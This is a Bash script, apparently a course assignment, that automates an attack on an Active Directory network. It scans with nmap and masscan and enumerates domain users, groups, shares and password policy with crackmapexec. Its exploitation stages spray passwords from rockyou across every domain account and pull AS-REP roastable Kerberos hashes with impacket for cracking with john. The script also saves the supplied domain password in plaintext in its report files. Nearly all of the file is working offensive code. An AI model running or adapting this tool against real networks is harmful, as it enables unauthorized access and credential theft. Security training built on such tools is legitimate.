#!/bin/bash

SCRIPT_NAME="$(basename "$0")"

help_menu() {
    echo "Help Menu for $SCRIPT_NAME"
    echo ""
    echo "Scanning Mode:"
    echo "1. Basic: 'nmap -Pn <target>' (bypassing discovery phase)."
    echo "2. Intermediate: 'masscan -p1-65535 -iL <targets> --rate=1000' (scan all ports)."
    echo "3. Advanced: 'masscan -pU:1-65535 -iL <targets> --rate=1000' (include UDP scanning)."
    echo ""
    echo "Enumeration Mode:"
    echo "1. Basic:"
    echo "- 'nmap -sV <target>' (Identify services)."
    echo "- Identify the IP Address of the Domain Controller."
    echo "- Identify the IP Address of the DHCP server."
    echo ""
    echo "2. Intermediate:"
    echo "- Enumerate IPs for key services: FTP, SSH, SMB, WinRM, LDAP, RDP."
    echo "- 'smbmap' (Enumerate shared folders)."
    echo "- NSE scripts: 'smb-vuln-ms17-010.nse', 'nbstat.nse', 'os-discovery.nse'."
    echo ""
    echo "3. Advanced (if AD creds provided):"
    echo "- Extract all users, groups and shared folders (crackmapexec)."
    echo "- Display password policy."
    echo "- Find disabled accounts, never-expired accounts, Domain Admin members."
    echo ""
    echo "Exploitation Mode:"
    echo "1. Basic: Deploy the NSE vulnerability scanning script."
    echo "2. Intermediate: Execute domain-wide password spraying to identify weak credentials."
    echo "3. Advanced: Extract and attempt to crack Kerberos tickets using pre‑supplied passwords (impacket)."
    echo ""
    echo "All results are saved to the specified directory and a report is generated at the end."
}

if [ "$1" = "-h" ]; then
    help_menu
    exit 0
fi

##1.1. Prompt the user to enter the target network range for scanning.
user_input() {
    while true; do
        echo "Target IP or CIDR (e.g. 192.168.1.5 or 192.168.1.0/24):"
        read NET
        if echo "$NET" | grep -q "/"; then
            IP=${NET%%/*}
            PREFIX=${NET##*/}
        else
            IP=$NET
            PREFIX=""
        fi
        # Validate IP format
        DOTS=$(echo "$IP" | tr -cd '.' | wc -c)
        [ "$DOTS" -ne 3 ] && { echo "[!] Bad IP format."; continue; }
        IFS='.' read -r oct1 oct2 oct3 oct4 <<<"$IP"
        VALID_IP=true
        for oc in "$oct1" "$oct2" "$oct3" "$oct4"; do
            if ! echo "$oc" | grep -q '^[0-9]\+$'; then VALID_IP=false; fi
            if [ "$oc" -lt 0 ] || [ "$oc" -gt 255 ]; then VALID_IP=false; fi
        done
        [ "$oct1" -eq 0 ] && VALID_IP=false
        [ "$VALID_IP" != true ] && { echo "[!] Bad IP."; continue; }
        # Validate CIDR prefix if provided
        if [ -n "$PREFIX" ]; then
            if ! echo "$PREFIX" | grep -q '^[0-9]\+$' || [ "$PREFIX" -lt 0 ] || [ "$PREFIX" -gt 32 ]; then
                echo "[!] CIDR must be between 0 and 32."
                continue
            fi
        fi
        echo "[✓] Valid target: $NET" 
        break
    done
##1.2. Ask for the Domain name and Active Directory (AD) credentials.

    read -p "[+] Please enter Domain name: " DOMAIN_NAME
    read -p "[+] If given please enter active domain username (if not leave empty): " AD_USER
    read -p "[+] If given please enter active domain password (if not leave empty): " AD_PASS
    echo ""

##1.3. Prompt the user to choose a password list, defaulting to Rockyou if none is specified.
    read -e -p "[+] please provide a password list (if none specified, will default to Rockyou password list): " PASS_LIST
    if [ -z "$PASS_LIST" ]; then
        echo "[+] Ok using default list: /usr/share/wordlists/rockyou.txt"
        PASSLIST='/usr/share/wordlists/rockyou.txt'
    elif [ ! -f "$PASS_LIST" ]; then
        echo "Cannot find file. Using default list: /usr/share/wordlists/rockyou.txt"
        PASSLIST='/usr/share/wordlists/rockyou.txt'
    else
        PASSLIST="$PASS_LIST"
    fi
}
##USER DIRECTORY
user_dir() {
    while true; do
        read -p "[+] Please provide a directory name to save all the results to: " DIR_NAME
        if [ -d "$DIR_NAME" ]; then
            echo " [!] Directory already exists, please provide a different name."
        elif [ -z "$DIR_NAME" ]; then
            echo " [!] Directory name can't be blank."
        else
            mkdir -p "$DIR_NAME"
            echo "[+] Results will be saved to $PWD/$DIR_NAME"
            break
        fi
    done
    DIR_PATH="$PWD/$DIR_NAME"
    # Preserve compatibility with older variables
    DIRPATH="$DIR_PATH"
    DNAME="$DOMAIN_NAME"
}

user_input
user_dir

echo "User Inputs Summary:" > "$DIR_PATH/user_inputs_summary.txt"
echo "[+] Target Network: $NET" >> "$DIR_PATH/user_inputs_summary.txt"
echo "[+] Domain Name: $DOMAIN_NAME" >> "$DIR_PATH/user_inputs_summary.txt"
echo "[+] Active Domain User: $AD_USER" >> "$DIR_PATH/user_inputs_summary.txt"
echo "[+] Active Domain Password: $AD_PASS" >> "$DIR_PATH/user_inputs_summary.txt"
echo "[+] Password List: $PASSLIST" >> "$DIR_PATH/user_inputs_summary.txt"
echo "[+] Results Directory: $DIR_PATH" >> "$DIR_PATH/user_inputs_summary.txt"

# Scanning functions
#2.1. Basic: Use the -Pn option in Nmap to assume all hosts are online, bypassing the discovery phase
basic_scanning() {
    echo "[+] Performing Basic Scanning using on $NET -Pn option in Nmap to assume all hosts are online, bypassing the discovery phase" | tee "$DIR_PATH/NMAPB_BASIC_RES.txt"
    nmap "$NET" -Pn | tee -a "$DIR_PATH/NMAPB_BASIC_RES.txt"
    grep 'report for' "$DIR_PATH/NMAPB_BASIC_RES.txt" | awk '{print $NF}' | tr -d '()' > "$DIR_PATH/LIVE_HOSTS.txt"
    LIVE_HOSTS=$(cat "$DIR_PATH/LIVE_HOSTS.txt")
}
#2.2. Intermediate: Scan all 65535 ports using the -p- flag.
intermediate_scanning() {
    echo "[+] Performing Intermediate Scanning using masscan on all TCP ports"
    if [ ! -s "$DIR_PATH/LIVE_HOSTS.txt" ]; then
        echo "[!] No live hosts found. Skipping intermediate scan."
        return
    fi
    masscan -p1-65535 -iL "$DIR_PATH/LIVE_HOSTS.txt" --rate=1000 -oG "$DIR_PATH/MASSCAN_TCP.txt"
}
#2.3. Advanced: Include UDP scanning for a thorough analysis.
advanced_scanning() {
    echo "[+] Performing Advanced Scanning, Include UDP scanning for a thorough analysis"
    if [ ! -s "$DIR_PATH/LIVE_HOSTS.txt" ]; then
        echo "[!] No live hosts found. Skipping advanced scan."
        return
    fi
    masscan -pU:1-65535 -iL "$DIR_PATH/LIVE_HOSTS.txt" --rate=1000 -oG "$DIR_PATH/MASSCAN_UDP.txt"
}

merge_for_nmap_sv() {
  cat "$DIR_PATH/MASSCAN_TCP.txt" \
  | awk '
    {
      if (match($0, /Host:[[:space:]]*([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)/, m) && match($0, /Ports:[[:space:]]*([^ \t\r\n]+)/, n)) {
        ip = m[1];
        # split entire line on whitespace and look for entries like "NNN/open"
        nsplit = split($0, arr, /[ \t]+/);
        for (i=1; i<=nsplit; i++) {
          if (match(arr[i], /^([0-9]+)\/open/, p)) {
            print ip " " p[1];
          }
        }
      }
    }
  ' \
  | sort -u \
  | awk '{ a[$1] = a[$1] "," $2 } END { for (ip in a) { sub(/^,/, "", a[ip]); print ip ":" a[ip] } }' \
  | while IFS=: read -r ip ports; do
      sorted=$(echo "$ports" | tr ',' '\n' | sort -n | uniq | paste -s -d, -)
      echo "$ip:$sorted"
    done \
  | sort -V > "$DIR_PATH/open_ports_to_scan.txt"
}

merge_for_nmap_su() {
  cat "$DIR_PATH/MASSCAN_UDP.txt" \
  | awk '
    {
      if (match($0, /Host:[[:space:]]*([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)/, m) && match($0, /Ports:[[:space:]]*([^ \t\r\n]+)/, n)) {
        ip = m[1];
        # split entire line on whitespace and look for entries like "NNN/open"
        nsplit = split($0, arr, /[ \t]+/);
        for (i=1; i<=nsplit; i++) {
          if (match(arr[i], /^([0-9]+)\/open/, p)) {
            print ip " " p[1];
          }
        }
      }
    }
  ' \
  | sort -u \
  | awk '{ a[$1] = a[$1] "," $2 } END { for (ip in a) { sub(/^,/, "", a[ip]); print ip ":" a[ip] } }' \
  | while IFS=: read -r ip ports; do
      sorted=$(echo "$ports" | tr ',' '\n' | sort -n | uniq | paste -s -d, -)
      echo "$ip:$sorted"
    done \
  | sort -V > "$DIR_PATH/open_UDP_ports_to_scan.txt"
}

basic_enumeration() {
    echo "[+] Performing Basic Enumeration..."
    # Skip if no hosts or scan results
    if [ ! -s "$DIR_PATH/LIVE_HOSTS.txt" ]; then
        echo "[!] No live hosts or scan results to enumerate. Skipping basic enumeration."
        return
    fi
    merge_for_nmap_sv
##3.1.1 Run nmap -sV on aggregated open ports
    for line in $(cat "$DIR_PATH/open_ports_to_scan.txt"); do
        ip=$(echo "$line" | cut -d: -f1)
        ports=$(echo "$line" | cut -d: -f2-)
        if [ "$ports" = "no-open-ports-found" ]; then
            echo "[!] $ip — no ports to scan with -sV; skipping."
            continue
        fi
        out_nmap="$DIR_PATH/NMAPT_${ip}.txt"
        echo "[*] Running: nmap -Pn -sV -p $ports $ip -> $out_nmap"
        nmap -Pn -sV -p "$ports" "$ip" -oN "$out_nmap"
    done
    echo "[✓] Done: service scans saved under $DIR_PATH"

## 3.1.2. Identify the IP Address of the Domain Controller.
    echo "[+] Checking for open LDAP ports..."
    for file in "$DIR_PATH"/NMAPT_*.txt; do
        [ -f "$file" ] || continue
        echo "Checking file: $file"
        if grep -qi 'ldap' "$file"; then
            echo "Open LDAP port found in file: $file"
            echo "$file" | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}' >> "$DIR_PATH/Domain_ip.txt"
            echo "domain ip: $(cat "$DIR_PATH/Domain_ip.txt")"
        fi
    done
    
#    #3.1.3. Identify the IP Address of the DHCP server.
    echo "[+] Checking for open DHCP server"
    : > "$DIR_PATH//DHCP_server_ip.txt"
    nmap --script broadcast-dhcp-discover $NET -oN "$DIR_PATH/dhcp_discover.txt"
    if grep -q "DHCP Message Type" "$DIR_PATH/dhcp_discover.txt"; then
        grep "DHCP Message Type" "$DIR_PATH/dhcp_discover.txt" | tee -a "$DIR_PATH/DHCP_server_ip.txt"
        grep "Server Identifier" "$DIR_PATH/dhcp_discover.txt" | awk -F: '{print $2}' | tr -d ' ' | tee -a "$DIR_PATH/DHCP_server_ip.txt"
        echo "DHCP server ip: $(cat "$DIR_PATH/DHCP_server_ip.txt")"
    else
        echo "No DHCP server found."
    fi
    }

intermediate_enumeration() {
    echo "[+] Performing Intermediate Enumeration..."
    local files=("$DIR_PATH"/NMAPT_*.txt)
    if [ ${#files[@]} -eq 0 ]; then
        echo "[!] No scan result files to process; skipping intermediate enumeration."
        return
    fi
# 3.2.1. Enumerate IPs for key services: FTP, SSH, SMB, WinRM, LDAP, RDP.
    for file in "${files[@]}"; do
        [ -f "$file" ] || continue
        echo "Checking file for key services: $file"
        if grep -qiE 'ftp|ssh|microsoft-ds|ldap|ms-wbt-server|winrm' "$file"; then
            echo "Key service port found in IP:" | tee "$DIR_PATH/enumerated_key_services_ips.txt"
            echo "$file" | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}' | tee -a "$DIR_PATH/enumerated_key_services_ips.txt"
        else
            echo "No key service port found in IP:" | tee "$DIR_PATH/enumerated_key_services_ips.txt"
            echo "$file" | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}'  | tee "$DIR_PATH/enumerated_key_services_ips.txt"
        fi
    done
#3.2.2. Enumerate shared folders.
    if [ -f "$DIR_PATH/Domain_ip.txt" ]; then
        if [ -n "$AD_USER" ] && [ -n "$AD_PASS" ]; then
            echo "Enumerate shared folders:" | tee "$DIR_PATH/share_folders"
            for ip in $(cat "$DIR_PATH/Domain_ip.txt"); do
                smbmap -u "$AD_USER" -p "$AD_PASS" -H "$ip" 2>/dev/null | tee -a "$DIR_PATH/share_folders"
            done
        fi
    else
        echo "Domain controller IP not found; skipping share enumeration."
    fi
#3.2.3. Add three (3) NSE scripts you think can be relevant for enumerating domain networks.
    echo "nse scripts that can help enumerate the domain:"
    mkdir -p "$DIR_PATH/nse_scripts" >/dev/null 2>&1

    for ip in $(cat "$DIR_PATH/Domain_ip.txt"); do
        echo "Os discovery for $ip" > "$DIR_PATH/nse_scripts/os-discovery_${ip}.txt" 
        echo "Os discovery for $ip"
        nmap -Pn -p 445 --script smb-os-discovery.nse "$ip" -oN "$DIR_PATH/nse_scripts/os-discovery_${ip}.txt"
        sleep 0.3
        echo "Vuln MS17-010 for $ip" > "$DIR_PATH/nse_scripts/vuln-ms17-010_${ip}.txt"
        echo "Vuln MS17-010 for $ip"
        nmap -Pn -p 445 --script smb-vuln-ms17-010.nse "$ip" -oN "$DIR_PATH/nse_scripts/vuln-ms17-010_${ip}.txt"
        sleep 0.3
        echo "NetBIOS / NetBT name enumeration (nbstat) for $ip" > "$DIR_PATH/nse_scripts/nbstat_${ip}.txt"
        echo "NetBIOS / NetBT name enumeration (nbstat) for $ip"
        nmap -Pn -p 137,139,445 --script nbstat.nse "$ip" -oN "$DIR_PATH/nse_scripts/nbstat_${ip}.txt"
        sleep 0.3
    done

}

advanced_enumeration() {
     if [ -z "${AD_USER// /}" ] || [ -z "${AD_PASS// /}" ]; then
    echo "[!] AD credentials not provided — skipping Advanced Enumeration."
    return 0
    fi
    echo "[+] Performing Advanced Enumeration..."
    mkdir -p "$DIR_PATH/groups_and_users" > /dev/null 2>&1
    mkdir -p "$DIR_PATH/nse_scripts" >/dev/null 2>&1
    # 3.3.1. Extract all users
    for i in $(cat "$DIR_PATH/Domain_ip.txt"); do
        crackmapexec smb "$i" -u "$AD_USER" -p "$AD_PASS" --users >> "$DIR_PATH/groups_and_users/users.txt"
        sleep 0.3
    done
    echo "Users found in the domain:";
    if grep -q "STATUS_LOGON_FAILURE" "$DIR_PATH/groups_and_users/users.txt"; then
        echo "Failed to extract users."
    else
        cat "$DIR_PATH/groups_and_users/users.txt" | grep -oP '\b[a-zA-Z0-9_.-]+\\[a-zA-Z0-9_.-]+' | awk -F '\\' '{print $2}' | tee "$DIR_PATH/groups_and_users/only_users.txt"
    fi
    echo ""

    # 3.3.2. Extract all groups
    for i in $(cat "$DIR_PATH/Domain_ip.txt"); do
        crackmapexec smb "$i" -u "$AD_USER" -p "$AD_PASS" --groups >> "$DIR_PATH/groups_and_users/groups.txt"
        sleep 0.3
    done
    echo "Groups found in the domain:";
    if grep -q "STATUS_LOGON_FAILURE" "$DIR_PATH/groups_and_users/groups.txt"; then
        echo "Failed to extract groups."
    else
        cat "$DIR_PATH/groups_and_users/groups.txt"
    fi
    echo ""

    #3.3.3. Extract all shares.
    for i in $(cat "$DIR_PATH/Domain_ip.txt"); do
        crackmapexec smb "$i" -u "$AD_USER" -p "$AD_PASS" --shares >> "$DIR_PATH/groups_and_users/shares.txt"
        sleep 0.3
    done
    echo "Shares found in the domain:";
    if grep -q "STATUS_LOGON_FAILURE" "$DIR_PATH/groups_and_users/shares.txt"; then
        echo "Failed to extract shares."
    else
        cat "$DIR_PATH/groups_and_users/shares.txt"
    fi
    echo ""

    # 3.3.4. Display password policy
    for i in $(cat "$DIR_PATH/Domain_ip.txt"); do
        crackmapexec smb "$i" -u "$AD_USER" -p "$AD_PASS" --pass-pol >> "$DIR_PATH/groups_and_users/pass_policy.txt"
        sleep 0.3
    done
    echo "Password policy found:";
    if grep -q "STATUS_LOGON_FAILURE" "$DIR_PATH/groups_and_users/pass_policy.txt"; then
        echo "Failed to retrieve password policy."
    else
        cat "$DIR_PATH/groups_and_users/pass_policy.txt" | grep -A 20 'Dumping password info for domain' | grep -E 'Minimum password length|Password history length|Maximum password age|Password Complexity Flags|Minimum password age|Reset Account Lockout Counter|Locked Account Duration|Account Lockout Threshold|Forced Log off Time'
    fi
    echo ""

    # 3.3.5. Find disabled accounts
    for i in $(cat "$DIR_PATH/Domain_ip.txt"); do
        crackmapexec smb "$i" -u "$AD_USER" -p "$AD_PASS" -X "Import-Module ActiveDirectory; Get-ADUser -Filter 'Enabled -eq \$false' -Properties Name,SamAccountName,DistinguishedName | Select-Object Name,SamAccountName,DistinguishedName | Sort-Object Name | Format-Table -AutoSize" >> $DIR_PATH/groups_and_users/raw_disabled_users.txt
        sleep 0.3
    done
    echo "Disabled users found in the domain:";
    if grep -q "STATUS_LOGON_FAILURE" "$DIR_PATH/groups_and_users/raw_disabled_users.txt"; then
        echo "Failed to find disabled users."
    else
        cat "$DIR_PATH/groups_and_users/raw_disabled_users.txt" 
    fi
    echo ""

    # 3.3.6. Find never-expired accounts
    for i in $(cat "$DIR_PATH/Domain_ip.txt"); do
        crackmapexec smb "$i" -u "$AD_USER" -p "$AD_PASS" -X "Import-Module ActiveDirectory; Get-ADUser -Filter 'PasswordNeverExpires -eq \$true' -Properties Name,SamAccountName,PasswordNeverExpires,DistinguishedName | Select-Object Name,SamAccountName,PasswordNeverExpires,DistinguishedName | Sort-Object Name | Format-Table -AutoSize" >> $DIR_PATH/groups_and_users/raw_never_expired_users.txt
        sleep 0.1
    done
    echo "Never expired users found in the domain:";
    if grep -q "STATUS_LOGON_FAILURE" "$DIR_PATH/groups_and_users/raw_never_expired_users.txt"; then
        echo "Failed to find never-expired users."
    else
        cat "$DIR_PATH/groups_and_users/raw_never_expired_users.txt"
    fi
    echo ""

    # 3.3.7. Display accounts that are members of the Domain Admins group
    for i in $(cat "$DIR_PATH/Domain_ip.txt"); do
        crackmapexec smb "$i" -u "$AD_USER" -p "$AD_PASS" --groups "Administrators" >> "$DIR_PATH/groups_and_users/admin_group.txt"
        sleep 0.1
    done
    echo "Members of the Domain Admins group:";
    if grep -q "STATUS_LOGON_FAILURE" "$DIR_PATH/groups_and_users/admin_group.txt"; then
        echo "Failed to retrieve Domain Admins group members."
    else
        cat "$DIR_PATH/groups_and_users/admin_group.txt" | grep -oP '\b[a-zA-Z0-9_.-]+\\[a-zA-Z0-9_.-]+' | awk -F '\\' '{print $2}'
    fi
    echo ""

}

# Exploitation functions
basic_exploitation() {
    echo "[+] Performing Basic Exploitation..."
    # Create directory to save NSE output
    # Ensure there are live hosts to target
    if [ ! -s "$DIR_PATH/LIVE_HOSTS.txt" ]; then
        echo "[!] No live hosts found. Skipping basic exploitation."
        return
    fi
    echo "running NSE vulnerability scan"
    # For each live host run the NSE vulnerability category, storing output per host
    while IFS= read -r host || [ -n "$host" ]; do
        [ -z "$host" ] && continue
        # Use the 'vuln' category to deploy vulnerability detection scripts against the host
        nmap -Pn --script vuln "$host" | tee "$DIR_PATH/vuln_$host.txt"
        sleep 0.1
    done < "$DIR_PATH/LIVE_HOSTS.txt"
}

intermediate_exploitation() {
    echo "[+] Performing Intermediate Exploitation..."
    mkdir -p "$DIR_PATH/password_spraying" >/dev/null 2>&1
    if [ ! -f "$DIR_PATH/Domain_ip.txt" ]; then
        echo "Domain controller IP not found; skipping password spraying."
        return
    fi
    for ip in $(cat "$DIR_PATH/Domain_ip.txt"); do
        crackmapexec smb "$ip" -u "$DIR_PATH/groups_and_users/only_users.txt" -p "$PASSLIST" --continue-on-success >> "$DIR_PATH/password_spraying/crack_users.txt"
        sleep 0.1
    done
    if [ -f "$DIR_PATH/password_spraying/crack_users.txt" ]; then
        grep "[+]" "$DIR_PATH/password_spraying/crack_users.txt" | awk '{print $6}' | sed 's/:/ password: /g' | sed 's/\\/ user: /g' | tee "$DIR_PATH/password_spraying/only_crack_users.txt"
    fi
}

advanced_exploitation() {
    echo "[+] Performing Advanced Exploitation..."
    mkdir -p "$DIRPATH/kerb" >/dev/null 2>&1

    local getnp_arg
    if [ -n "$AD_USER" ] && [ -n "$AD_PASS" ]; then
        getnp_arg="${DNAME}/${AD_USER}:${AD_PASS}"
    else
        getnp_arg="${DNAME}/"
    fi

    local users_file="$DIRPATH/groups_and_users/only_users.txt"
    local tickets_log="$DIRPATH/kerb/tickets.hash"          
    local asrep_output="$DIRPATH/kerb/asrep_output.txt"      
    local cracked_file="$DIRPATH/kerb/cracked_kerb.txt"


    python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py \
        "$getnp_arg" \
        -dc-ip "$(cat "$DIRPATH/Domain_ip.txt")" \
        -usersfile "$users_file" \
        -request \
        -format john -outputfile "$asrep_output" \
        > "$tickets_log" 2>/dev/null

    if [ ! -s "$asrep_output" ] && [ -s "$tickets_log" ]; then
        grep -E '^\$krb5asrep' "$tickets_log" | sort -u > "$asrep_output"
    fi

    if [ -s "$asrep_output" ]; then
        john --format=krb5asrep --wordlist="$PASSLIST" "$asrep_output" >/dev/null 2>&1
        echo ""
        echo "Passwords managed to be cracked:"
        john --show "$asrep_output" | tee -a "$cracked_file"
    else
        echo ""
        echo "No AS-REP roastable tickets found."
    fi
}


# Prompt for operation level selection
#1.4. Require the user to select a desired operation level (Basic, Intermediate, Advanced or 
echo "Choose the operation level for each mode before any actions are executed."
echo "1. Basic"
echo "2. Intermediate"
echo "3. Advanced"

read -p "Select operation level for Scanning Mode (1-3): " scanning_choice
read -p "Select operation level for Enumeration Mode (1-3): " enumeration_choice
read -p "Select operation level for Exploitation Mode (1-3): " exploitation_choice

# Execute Scanning based on choice
case "$scanning_choice" in
    1) basic_scanning ;;
    2) basic_scanning; intermediate_scanning ;;
    3) basic_scanning; intermediate_scanning; advanced_scanning ;;
    *) echo "Invalid Scanning choice. Exiting."; exit 1 ;;
esac

# Execute Enumeration based on choice
case "$enumeration_choice" in
    1) basic_enumeration ;;
    2) basic_enumeration; intermediate_enumeration ;;
    3) basic_enumeration; intermediate_enumeration; advanced_enumeration ;;
    *) echo "Invalid Enumeration choice. continuing without Enumeration." ;;
esac

# Execute Exploitation based on choice
case "$exploitation_choice" in
    1) basic_exploitation ;;
    2) basic_exploitation; intermediate_exploitation ;;
    3) basic_exploitation; intermediate_exploitation; advanced_exploitation ;;
    *) echo "Invalid Exploitation choice. continuing without Exploitation." ;;
esac

: > "$DIR_PATH/final_results.txt"
: > "$DIR_PATH/final_results2.txt"

echo "Final report performed in $(date)" > "$DIR_PATH/final_results.txt" 2>/dev/null || true
echo "User inputs are:" >> "$DIR_PATH/final_results.txt" 2>/dev/null || true
echo "" >> "$DIR_PATH/final_results.txt"

# user inputs
if [ -f "$DIR_PATH/user_inputs_summary.txt" ]; then
  cat "$DIR_PATH/user_inputs_summary.txt" >> "$DIR_PATH/final_results.txt" 2>/dev/null || true
else
  echo "[missing] $DIR_PATH/user_inputs_summary.txt" >> "$DIR_PATH/final_results.txt"
fi
echo "" >> "$DIR_PATH/final_results.txt"

# Basic scan
echo "Basic scan results:" >> "$DIR_PATH/final_results.txt" 2>/dev/null || true
echo "" >> "$DIR_PATH/final_results.txt"
if [ -f "$DIR_PATH/NMAPB_BASIC_RES.txt" ]; then
  cat "$DIR_PATH/NMAPB_BASIC_RES.txt" >> "$DIR_PATH/final_results.txt" 2>/dev/null || true
else
  echo "[missing] $DIR_PATH/NMAPB_BASIC_RES.txt" >> "$DIR_PATH/final_results.txt"
fi
echo "" >> "$DIR_PATH/final_results.txt"

# Intermediate scan (masscan TCP)
echo "Intermediate scan results:" >> "$DIR_PATH/final_results.txt" 2>/dev/null || true
echo "TCP open ports:" >> "$DIR_PATH/final_results.txt"
if [ -f "$DIR_PATH/MASSCAN_TCP.txt" ]; then
  cat "$DIR_PATH/MASSCAN_TCP.txt" >> "$DIR_PATH/final_results.txt" 2>/dev/null || true
else
  echo "[missing] $DIR_PATH/MASSCAN_TCP.txt" >> "$DIR_PATH/final_results.txt"
fi
echo "" >> "$DIR_PATH/final_results.txt"

# Advanced scan (masscan UDP)
echo "Advanced scan results:" >> "$DIR_PATH/final_results.txt" 2>/dev/null || true
echo "UDP open ports:" >> "$DIR_PATH/final_results.txt"
if [ -f "$DIR_PATH/MASSCAN_UDP.txt" ]; then
  cat "$DIR_PATH/MASSCAN_UDP.txt" >> "$DIR_PATH/final_results.txt" 2>/dev/null || true
else
  echo "[missing] $DIR_PATH/MASSCAN_UDP.txt" >> "$DIR_PATH/final_results.txt"
fi
echo "" >> "$DIR_PATH/final_results.txt"

echo "Basic Enumeration results: nmap -sV on each IP" >> "$DIR_PATH/final_results.txt"
echo "" >> "$DIR_PATH/final_results.txt"
cat "$DIR_PATH"/NMAP_*.txt >> "$DIR_PATH/final_results.txt" 2>/dev/null || true
echo "" >> "$DIR_PATH/final_results.txt"

# Domain / DHCP IPs
echo "Domain server Ip:" >> "$DIR_PATH/final_results.txt"
if [ -f "$DIR_PATH/Domain_ip.txt" ]; then
  cat "$DIR_PATH/Domain_ip.txt" >> "$DIR_PATH/final_results.txt"
else
  echo "[missing] $DIR_PATH/Domain_ip.txt" >> "$DIR_PATH/final_results.txt"
fi

echo "DHCP server Ip:" >> "$DIR_PATH/final_results.txt"
if [ -f "$DIR_PATH/DHCP_server_ip.txt" ]; then
  cat "$DIR_PATH/DHCP_server_ip.txt" >> "$DIR_PATH/final_results.txt"
else
  echo "[missing] $DIR_PATH/DHCP_server_ip.txt" >> "$DIR_PATH/final_results.txt"
fi
echo "" >> "$DIR_PATH/final_results.txt"

# NSE outputs (os-discovery, vuln-ms17-010, nbstat)
echo "Intermediate Enumeration results: os-discovery, vuln-ms17-010, nbstat" >> "$DIR_PATH/final_results.txt"
cat "$DIR_PATH"/nse_scripts/*.txt >> "$DIR_PATH/final_results.txt" 2>/dev/null || true

echo "Advanced Enumeration results:" >> "$DIR_PATH/final_results.txt"
for f in \
  "$DIR_PATH/groups_and_users/users.txt" \
  "$DIR_PATH/groups_and_users/groups.txt" \
  "$DIR_PATH/groups_and_users/shares.txt" \
  "$DIR_PATH/groups_and_users/pass_policy.txt" \
  "$DIR_PATH/groups_and_users/raw_disabled_users.txt" \
  "$DIR_PATH/groups_and_users/raw_never_expired_users.txt" \
  "$DIR_PATH/groups_and_users/admin_group.txt"; do
  if [ -f "$f" ]; then
    echo "---- $f ----" >> "$DIR_PATH/final_results.txt"
    cat "$f" >> "$DIR_PATH/final_results.txt"
    echo "" >> "$DIR_PATH/final_results.txt"
  else
    echo "[missing] $f" >> "$DIR_PATH/final_results.txt"
  fi
done

echo "Basic Exploitation results:" >> "$DIR_PATH/final_results.txt"
cat "$DIR_PATH"/vuln_*.txt >> "$DIR_PATH/final_results.txt" 2>/dev/null || true
echo "" >> "$DIR_PATH/final_results.txt"

echo "Intermediate Exploitation results:" >> "$DIR_PATH/final_results.txt"
if [ -f "$DIR_PATH/password_spraying/only_crack_users.txt" ]; then
  cat "$DIR_PATH/password_spraying/only_crack_users.txt" >> "$DIR_PATH/final_results.txt"
else
  echo "[missing] $DIR_PATH/password_spraying/only_crack_users.txt" >> "$DIR_PATH/final_results.txt"
fi
echo "" >> "$DIR_PATH/final_results.txt"

echo "Advanced Exploitation results:" >> "$DIR_PATH/final_results.txt"
if [ -f "$DIR_PATH/kerb/cracked_kerb.txt" ]; then
  cat "$DIR_PATH/kerb/cracked_kerb.txt" >> "$DIR_PATH/final_results.txt"
else
  echo "[missing] $DIR_PATH/kerb/cracked_kerb.txt" >> "$DIR_PATH/final_results.txt"
fi
echo "" >> "$DIR_PATH/final_results.txt"

echo "[+] final_results written to $DIR_PATH/final_results.txt"


# Convert to PDF (enscript and ps2pdf will be used without checks)
enscript "$DIR_PATH/final_results.txt" -p "$DIR_PATH/final_results2.txt" >/dev/null 2>&1
ps2pdf "$DIR_PATH/final_results2.txt" "$DIR_PATH/output.pdf" >/dev/null 2>&1
echo "[+] PDF report created at $DIR_PATH/output.pdf"